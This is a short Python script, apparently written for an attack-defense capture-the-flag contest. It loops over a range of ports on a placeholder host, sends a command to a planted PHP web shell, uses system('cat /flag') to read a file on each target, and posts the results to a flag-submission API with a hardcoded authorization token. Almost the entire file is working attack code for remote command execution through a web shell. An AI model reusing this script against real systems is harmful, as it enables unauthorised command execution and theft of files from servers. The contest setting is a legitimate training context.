# coding: UTF-8
import requests
import json

url1="http://xxxx:"
url2=""

flaglist=[]

path="/include/shell.php"
passwd="password"

flagadd="http://xxxx:8801/api/flag"   #提交flag的地址

#payload = {passwd: 'system(\'cat /f*\');'}
payload = {passwd: 'system(\'cat /flag\');'}


headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    }
headersflag={
        'Host': 'xxxx',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/json;charset=utf-8',
        'Authorization': 'bada82467423a6526d4d25abbe8cc43a',
        'Origin': 'http://xxxx',
        'Referer': 'http://xxxx/',
    }

i = 0

for url2 in range(8802,8810):
    url = url1 + str(url2) +path
    #print(url1 + str(url2))
    res=requests.post(url,payload, headers=headers)
    try:
        print(url1 + str(url2),res.text)
        # flag存入列表中
        flaglist.append(str(res.text))
        #print(flaglist[i])
        body = {"flag": str(flaglist[i])}
        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))
        i += 1
    except:
        pass